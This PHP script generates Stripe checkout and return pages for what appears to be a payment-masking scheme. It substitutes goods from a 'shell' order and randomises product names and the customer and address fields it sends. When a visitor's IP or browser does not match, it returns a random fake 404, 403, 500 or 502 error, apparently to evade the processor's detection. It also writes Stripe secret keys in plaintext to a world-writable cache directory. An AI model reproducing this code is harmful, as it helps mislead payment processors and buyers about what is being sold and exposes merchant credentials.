<?php
// ��ȡ �Զ����ֶ�
$meta_data = explode(',',$config['meta_data']);
$meta_data_str = "'" . $config["invoice"] . "' => " . '$invoiceNew,';
if (!empty($meta_data[0])) {
    $meta_data_str .= "'" . $meta_data[0] . "' => " . 'HTTPS_SERVER,';
}
if (!empty($meta_data[1])) {
    $meta_data_str .= "'" . $meta_data[1] . "' => " . '$order_id,';
}
if (!empty($meta_data[2])) {
    $meta_data_str .= "'" . $meta_data[2] . "' => " . '$order_number';
}

$product_name_arr = [
    '"Order No #".$order_number',
    '"$order_number"',
    '!empty($orderInfoGoods[0]["name"]) ? $orderInfoGoods[0]["name"] : "Special Offer ".$order_number',
    '"All Products #".$order_number'
];

$productName = $product_name_arr[mt_rand(0, count($product_name_arr) - 1)];


$index = '<?php
if ($goods_type == 1 && $order["is_test"] < 2) {
    $file_mame_get_shell_goods = explode("_", $order_number)[0] . count($order_goods);
    $orderInfoGoods = getBDomainOrderGoods($file_mame_get_shell_goods, $amount_ex, $order_number);
} else {
    $orderInfoGoods = $order_goods;
}

$code = 1;
if (empty($dataInfo["session_id"])) {
    try {
        require __DIR__ . "/vendor/autoload.php";
        setWebSecret($pk_secret, $sk_secret, $wb_secret);
        $stripe = new \Stripe\StripeClient($sk_secret);
        $amount_final = $amount_ex;
        if (in_array($currency_ex, ["BIF", "CLP", "DJF", "GNF", "JPY", "KMF", "KRW", "MGA", "PYG", "RWF", "UGX", "VND", "VUV", "XAF", "XOF", "XPF"])) {
            $amount_final = intVal(ceil($amount_ex));
        } else {
            $amount_final = intVal(bcmul($amount_ex, 100));
        }
        $notify_data["pay_amount"] = $amount_ex;
        $notify_data["pay_currency"] = $currency_ex;
        $notify_data["status"] = 2;
        // �����Զ����ֶ�
        $metadata = [
            ' . $meta_data_str . '
        ];
        ';
$r = mt_rand(1000, 9999);
if ($r < 7000) {

    $bii_address = [
        '"country" => $order_details["billing_country"]',
        '"state" => getState($order_details["billing_region"], $order_details["billing_country"])',
        '"city" => toUTF_8($order_details["billing_city"])',
        '"postal_code" => toUTF_8($order_details["billing_postcode"])',
        '"line1" => toUTF_8($order_details["billing_suburb"] . " " . $order_details["billing_street_address"])',
        '"line2" => toUTF_8($order_details["billing_suburb"] . " " . $order_details["billing_street_address"])',
    ];
    $count = mt_rand(1, count($bii_address));
    $bii_address_arr = array_slice($bii_address, 0, $count); // �� set �жϸ��������
    $bii_address_str = '[
    ';
    foreach ($bii_address_arr as $value) {
        $bii_address_str .= $value . ',
        ';
    }
    $bii_address_str .= ']';

    $shop_address = [
        '"country" => $order_details["shipping_country"]',
        '"state" => getState($order_details["shipping_region"], $order_details["shipping_country"])',
        '"city" => toUTF_8($order_details["shipping_city"])',
        '"postal_code" => toUTF_8($order_details["shipping_postcode"])',
        '"line1" => toUTF_8($order_details["shipping_suburb"] . " " . $order_details["shipping_street_address"])',
        '"line2" => toUTF_8($order_details["shipping_suburb"] . " " . $order_details["shipping_street_address"])',
    ];
    $count = mt_rand(1, count($shop_address));
    $shop_address_arr = array_slice($shop_address, 0, $count); // �� set �жϸ��������
    $shop_address_str = '[
    ';
    foreach ($shop_address_arr as $value) {
        $shop_address_str .= $value . ',
        ';
    }
    $shop_address_str .= ']';


    $customer = [
        '"shipping" => [
            "name" => trim(toUTF_8($order_details["billing_firstname"]) . " " . toUTF_8($order_details["billing_lastname"])),
            "phone" => toUTF_8($order_details["billing_telephone"]),
            "address" => $shop_address
        ]',
        '"address" => $bii_address',
        '"name" => trim(toUTF_8($order_details["billing_firstname"]) . " " . toUTF_8($order_details["billing_lastname"]))',
        '"phone" => toUTF_8($order_details["billing_telephone"])',
    ];
    $count = mt_rand(0, count($customer));
    $customer = array_slice($customer, 0, $count); // �� set �жϸ��������
    $customer[] = '"email" => toUTF_8($order_details["billing_email"])';
    $customer_str = '[
    ';
    foreach ($customer as $value) {
        $customer_str .= $value . ',
        ';
    }
    $customer_str .= ']';

    $customer_tag = '"customer" => $customer->id';
    $index .= '
        // ���� ��ַ����
        $bii_address = ' . $bii_address_str . ';
        $shop_address = ' . $shop_address_str . ';
        // ���� �û��ֶ�
        $customer = ' . $customer_str . ';
        $customer = $stripe->customers->create($customer);
    ';

} else {
    $customer_tag = '"customer_email" => toUTF_8($order_details["billing_email"])';
}

$index .= '
        $body = [
            "mode" => "payment",
            "cancel_url" => $dataInfo["cancel_url"] . "&session_id={CHECKOUT_SESSION_ID}",
            "success_url" => $dataInfo["return_url"] . "&session_id={CHECKOUT_SESSION_ID}",
            "line_items" => [ [ "price_data" => [ "unit_amount" => $amount_final, "currency" => $currency_ex, "product_data" => ["name" => ' . $productName . '] ], "quantity" => 1 ] ],
            "metadata" => $metadata,
            ' . $customer_tag . '
        ];
        
        addChannelLog($order_number . " jump body:" . @json_encode($body), $payment_code);
        $response = $stripe->checkout->sessions->create($body);
        $payment_method_types = implode(",", $response->payment_method_types);
        setCache($currency_ex, $payment_method_types);
        addChannelLog($order_number . " jump response:" . @json_encode($response), $payment_code);
        $session_id = $response->id;
        $redirect_url = $response->url;
    } catch (Exception $ex) {
        $comment = "error:" . $ex->getMessage();
    }
    if (!empty($comment)) {
        addChannelLog($order_number . " jump error:" . $comment, $payment_code);
    } elseif (empty($session_id)) {
        $comment = "create session_id failed!";
    } else {
        $notify_data["status"] = 6;
        $dataInfo["session_id"] = $session_id;
        $dataInfo["stripe_redirect_url"] = $redirect_url;
        $dataInfo["cache_order_ip"] = get_client_ip();
        $dataInfo["cache_order_time"] = time();
        $dataInfo["cache_order_clicks"] = 0;
        $dataInfo["cache_order_user_agent"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
        $dataInfo["cache_order_status"] = $notify_data["status"];
        saveOrderCache($xeppFileName, $dataInfo);
        $comment = "payment redirect!";
    }
} else {
    $notify_data["status"] = 6;
    $session_id = $dataInfo["session_id"];
    $redirect_url = $dataInfo["stripe_redirect_url"];
    $comment = "payment redirect!";
}

$notify_data["comment"] = $comment;
updateOrderStatus($notify_data);

if ($notify_data["status"] != 6 && !empty($re_arr["redirect_next"])) {
    $redirect_url = $re_arr["redirect_next"];
}
if (isset($redirect_url)) {
    echo "<script> window.location.href = \'{$redirect_url}\' </script>";
} else {
    redirect($result_url);
}
die;


function setCache($key, $val)
{
    $path = DIR_FS_CATALOG_CACHE . "/st/";
    is_dir($path) || mkdir($path, 0777, true);
    $filename = $path . "payment_method_types_{$key}.txt";
    if (@file_put_contents($filename, $val)) {
        return true;
    } else {
        return false;
    }
}

function setWebSecret($publicKey, $SecretKey, $wb_secret)
{
    $path = DIR_FS_CATALOG_CACHE . "/st/";
    is_dir($path) || mkdir($path, 0777, true);
    $filename = $path . "wb_secret.txt";
    $content = [
        "pk_secret" => $publicKey,
        "sk_secret" => $SecretKey,
        "wb_secret" => $wb_secret,
    ];
    if (@file_put_contents($filename, json_encode($content))) {
        return true;
    } else {
        return false;
    }
}
';
$response = [
    'index_code' => file_put_contents($oldPath . '/' . $channel . '/jump.php', $index)
];

$return_arr = [
    'redirect(HTTPS_SERVER);',
    'http_response_code(404);
    header("HTTP/1.1 404 Not Found");',
    'http_response_code(403);
    header("HTTP/1.1 403 Access Forbidden");',
    'http_response_code(500);
    header("HTTP/1.1 500 Internal Server Error");',
    'http_response_code(502);
    header("HTTP/1.1 502 Bad Gateway");'
];
$return_str = $return_arr[mt_rand(0, count($return_arr) - 1)];


$return = '<?php
addChannelLog($order_number . " return REQUEST:" . @json_encode($_REQUEST), $payment_code);
$redirect = $result_url;
// ����ҳ�����ж�
$is_return = pageVerification($dataInfo, $is_return_check);

require __DIR__ . "/vendor/autoload.php";
$stripe = new \Stripe\StripeClient($sk_secret);
$session_id = $dataInfo["session_id"];
$response = $stripe->checkout->sessions->retrieve($session_id, []);
addChannelLog($order_number . " return $response: " . @json_encode($response), $payment_code);
$id = "";
$payment_status = "";
if (isset($response->payment_intent)) {
    $id = $response->payment_intent;
}
if (isset($response->payment_status)) {
    $payment_status = $response->payment_status;
}

$notify_data["transaction_number"] = $id;
$commit = "return completed" . $payment_status;
if (in_array($payment_status, ["paid", "succeeded", "complete"])) {
    $notify_data["status"] = 1;
} else {
    $notify_data["status"] = 2;
}
// ------------ ���� end --------------
$dataInfo["cache_order_status"] = $notify_data["status"];
$dataInfo["cache_order_clicks"] = 1;
saveOrderCache($xeppFileName, $dataInfo);

$notify_data["comment"] = $commit;
$re_arr = updateOrderStatus($notify_data, "return", !$is_return["status"]);
if (!empty($re_arr["redirect_next"])) {
    $redirect = $re_arr["redirect_next"];
}

// ���IP
if ($is_return["status"]) {
    if ($is_return["status"] == 1){
        $error_sys_url = $pay_checkout_url . "errorOrderUpdate";
        $error_sys_data = [
            "sys_order_id" => $order_id,
            "ip" => $is_return["ip"],
            "order_ip" => $is_return["order_ip"],
            "browser" => $is_return["browser"],
            "note" => $is_return["note"],
            "payment_code" => $payment_code,
            "order_number" => $order_number
        ];
        curl_pay($error_sys_url, $dataInfo["access_token"], $error_sys_data);
    }
    ' . $return_str . '
}else{
    redirect($redirect);
}
die;
';
$response['return_code'] = file_put_contents($oldPath . '/' . $channel . '/return.php', $return);
